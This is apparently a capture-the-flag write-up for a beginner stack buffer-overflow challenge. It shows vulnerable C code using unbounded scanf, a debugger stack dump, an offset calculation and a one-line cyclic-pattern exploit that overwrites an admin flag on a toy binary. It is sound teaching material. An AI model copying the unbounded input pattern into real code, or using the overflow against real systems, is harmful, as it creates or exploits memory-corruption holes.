
# BOF1

## Overview
In this challenge, there is a *buffer overflow vulnerability* in the main function. The goal is to overflow into the next variable and make it a non-zero number

### Source Code Summary

```c

int main(void) {
	int admin = 0;
	char buf[32];
	
	scanf("%s", buf);
	
	if(admin) {
		win();
	}
	else {
		puts("nope!");
	}
	
	return 0;
}

```

We need to overflow in the `admin` and change it to something else other than zero.
#### Vulnerability
```c
char buf[32];
scanf("%s", buf);	
```

`scanf` does no bounds checking.

### Exploit

Overflow into `admin` variable

Stack

```
gef➤  x/12gx $rsp
0x7fffffffde90:	0x4141414141414141	0x0000000000000000
0x7fffffffdea0:	0x0000000000000000	0x00007ffff7fe5f70
0x7fffffffdeb0:	0x0000000000000000	0x00000000f7ffdad0
0x7fffffffdec0:	0x0000000000000001	0x00007ffff7deb24a
0x7fffffffded0:	0x00007fffffffdfc0	0x0000000000401246
0x7fffffffdee0:	0x0000000100400040	0x00007fffffffdfd8
```

Address of `admin`
```
 x/wx $rbp-0x4
0x7fffffffdebc:	0x00000000
```

offset to admin `0x7fffffffdebc - 0x7fffffffde90 = 44`

exploit

offset + 4 bytes to fill `admin` 

```sh
pwn cyclic 48 | ./bof1
fake_flag
```

Got the flag